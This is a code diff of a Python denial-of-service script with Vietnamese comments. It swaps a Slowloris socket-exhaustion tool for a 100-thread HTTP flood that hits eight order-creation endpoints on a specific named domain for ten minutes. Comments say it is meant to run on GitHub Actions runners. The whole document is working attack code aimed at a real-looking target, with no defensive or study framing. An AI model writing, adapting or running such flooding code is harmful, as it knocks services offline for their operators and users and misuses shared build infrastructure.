@@ -1,75 +1,81 @@
-import socket
+import requests
+import threading
 import random
 import time
-import argparse
+import sys
 
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
+# --- CẤU HÌNH ---
+TARGET_ENDPOINTS = [
+    "https://applep12.com/CreateOrder/Ultimate", "https://applep12.com/CreateOrder/Premium",
+    "https://applep12.com/CreateOrder/Custom", "https://applep12.com/CreateOrder/Plus",
+    "https://applep12.com/CreateOrder/Standard", "https://applep12.com/CreateOrder/Slow",
+    "https://applep12.com/CreateOrder/Basic", "https://applep12.com/CreateOrder/Started"
 ]
+THREAD_COUNT = 100 # Số luồng cho mỗi máy ảo GitHub
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+}
+# --- KẾT THÚC CẤU HÌNH ---
 
-def create_socket(target_host, target_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(4)
-        s.connect((target_host, target_port))
-        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
-        s.send(f"Host: {target_host}\r\n".encode("utf-8"))
-        s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
-        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
-        return s
-    except socket.error as e:
-        return None
+STOP_FLAG = False
+request_count = 0
+error_count = 0
+
+def attack():
+    global request_count, error_count
+    session = requests.Session()
+    session.headers.update(HEADERS)
+    while not STOP_FLAG:
+        try:
+            target = random.choice(TARGET_ENDPOINTS)
+            response = session.get(target, timeout=10)
+            request_count += 1
+            if response.status_code != 200:
+                error_count += 1
+        except requests.exceptions.RequestException:
+            error_count += 1
+        time.sleep(0.05)
+
+def print_status():
+    """In trạng thái ra màn hình mỗi giây."""
+    while not STOP_FLAG:
+        sys.stdout.write(f"\rRequests: {request_count} | Errors: {error_count}  ")
+        sys.stdout.flush()
+        time.sleep(1)
 
 def main():
-    parser = argparse.ArgumentParser(description="Slowloris Test Tool.")
-    parser.add_argument("host", help="Target website IP or domain.")
-    parser.add_argument("-p", "--port", type=int, default=80, help="Web server port (default: 80).")
-    parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets to open (default: 150).")
-    parser.add_argument("-i", "--interval", type=int, default=15, help="Interval (seconds) to send keep-alive headers (default: 15).")
+    global STOP_FLAG
+    threads = []
+    print(f"[*] Starting resource attack with {THREAD_COUNT} threads.")
     
-    args = parser.parse_args()
+    # Tạo một luồng riêng chỉ để in trạng thái
+    status_thread = threading.Thread(target=print_status)
+    status_thread.daemon = True
+    status_thread.start()
 
-    target_host = args.host
-    target_port = args.port
-    socket_count = args.sockets
-    interval = args.interval
-    
-    list_of_sockets = []
+    for i in range(THREAD_COUNT):
+        thread = threading.Thread(target=attack)
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
 
-    print(f"[*] Attacking {target_host} on port {target_port}")
-    print(f"[*] Opening {socket_count} connections.")
-
-    for _ in range(socket_count):
-        s = create_socket(target_host, target_port)
-        if s:
-            list_of_sockets.append(s)
-
-    print(f"[*] Successfully opened {len(list_of_sockets)} connections.")
-    
-    while True:
-        print(f"[*] Keeping {len(list_of_sockets)} connections alive...")
-        try:
-            for s in list(list_of_sockets):
-                try:
-                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
-                except socket.error:
-                    list_of_sockets.remove(s)
-
-            diff = socket_count - len(list_of_sockets)
-            if diff > 0:
-                print(f"[*] {diff} connections were closed. Re-opening...")
-                for _ in range(diff):
-                    s = create_socket(target_host, target_port)
-                    if s:
-                        list_of_sockets.append(s)
-
-            time.sleep(interval)
-
-        except (KeyboardInterrupt, SystemExit):
-            print("\n[!] Attack stopped.")
-            break
+    # Giữ cho chương trình chạy trong một khoảng thời gian nhất định (ví dụ: 10 phút)
+    # vì chúng ta không thể nhấn Ctrl+C trên GitHub Actions.
+    try:
+        time.sleep(600) # Chạy trong 10 phút
+    finally:
+        print("\n[*] Time limit reached. Stopping attack.")
+        STOP_FLAG = True
+        for thread in threads:
+            thread.join()
+        print(f"[*] Attack stopped. Total requests: {request_count}, Errors: {error_count}")
 
 if __name__ == "__main__":
+    # Cài đặt thư viện requests trước khi chạy
+    try:
+        import requests
+    except ImportError:
+        import os
+        os.system('pip install requests')
+        import requests
     main()
